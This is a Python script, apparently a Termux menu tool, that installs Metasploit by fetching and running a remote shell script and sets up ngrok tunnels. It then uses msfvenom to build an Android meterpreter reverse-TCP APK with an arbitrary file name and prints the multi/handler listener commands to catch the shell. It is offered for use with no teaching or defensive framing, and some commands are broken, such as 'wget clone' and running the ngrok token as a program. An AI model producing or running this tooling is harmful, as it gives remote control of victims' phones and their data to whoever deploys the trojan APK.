import os,sys
os.system('clear')
print('''\033[1;32m

████████████████████████████████████████████████████████████████████████████████
█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█▒▒▒▒▒▒█████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▒▒██▒▒▄▀▄▀▒▒█▒▒▄▀▒▒█████████▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█▒▒▄▀▒▒█████████▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒███▒▒▄▀▄▀▒▒▄▀▄▀▒▒███▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███▒▒▒▒▄▀▄▀▄▀▒▒▒▒███▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█████▒▒▒▒▄▀▒▒▒▒█████▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███████▒▒▄▀▒▒███████▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒███████▒▒▄▀▒▒███████▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒███████▒▒▄▀▒▒███████▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
█▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒███████▒▒▄▀▒▒███████▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
█▒▒▒▒▒▒█████████▒▒▒▒▒▒██▒▒▒▒▒▒███████▒▒▒▒▒▒███████▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
████████████████████████████████████████████████████████████████████████████████


''')
print('''\033[1;32m
                              𝗧𝗘𝗠 𝗣𝗛𝗣
                          
''')
print('''\033[1;32m
[1] install metasploit

[2] install ngrok

[3] payload


''')
k = input('\033[1;32mEnter : ')
if k == '1':
	os.system('clear')
	os.system('apt update;apt upgrade;pkg update;pkg upgrade')
	os.system('pkg install wget')
	os.system('pkg install ruby')
	os.system('pkg install perl')
	os.system('pkg install pip')
	os.system('pkg install proot')
	os.system('pkg install curl')
	os.system('gem install resolved')
	os.system('clear')
	os.system('wget clone https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh')
	os.system('chmod +x metasploit.sh')
	os.system('./metasploit.sh')
	os.system('clear')
	print('\033[1;32mDo you want to run metasploit')
	w = input('\033[1;33mEnter [ n / y ] : ')
	if w == 'y':
		os.system('clear')
		os.system('msfconsole')
	if w == 'n':
		os.system('python3 paylo.py')
elif k == '2':
	os.system('clear')
	t = input('Enter token : ')
	os.system('pkg install wget')
	os.system('pkg install unzip')
	os.system('pkg install zip')
	os.system('wget clone https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip')
	os.system('unzip ngrok-v3-stable-linux-arm64.zip ')
	os.system('chmod +x ngrok')
	os.system('./'+t)
	os.system('clear')
	print('Do you want to run ngrok')
	i = input('Enter [ n / y ]')
	if i == 'y':
		os.system('clear')
		print('''
[1] tcp
		
[2] http
		
		''')
		z = input('Enter numer : ')
		if z == '1':
			os.system('clear')
			s = input('Enter port : ')
			os.system('./ngrok tcp '+s)
		if z == '2':
			an = input('Enter port : ')
			os.system('./ngrok http '+an)
			os.system('python3 paylo.py')
if k == '3':
	os.system('clear')
	g = input('\033[1;32mEnter HOST :  ')
	v = input('\033[1;33mEnter PORT :  ')
	h = input('\033[1;34mEnter name :  ')
	print('''\033[1;33m
	                   palse wait
	
	''')
	os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST='+g+' LPORT='+v+' R> /sdcard/'+h+'.apk')
	print('''
	                             
	                             
	                             
	                             
	                             
	                             
	                             
	                             
	                             plase wait
	             ''')
os.system('clear')
print('\033[1;32mDo you want to run metasploit')
u = input('\033[1;34mEnter [ n / y ]')
if u == 'y':
	os.system('clear')
	print('\033[1;33m      plase wait   ')
	os.system('msfconsole')
print('\033[1;32muse exploit/multi/handler')
print('\033[1;32mset payload android/meterpreter/reverse_tcp')
print('\033[1;33mset LHOST ')
print('\033[1;32mset LPORT ')
print('\033[1;32mexploit')
if u == 'n':
	os.system('python3 paylo.py')
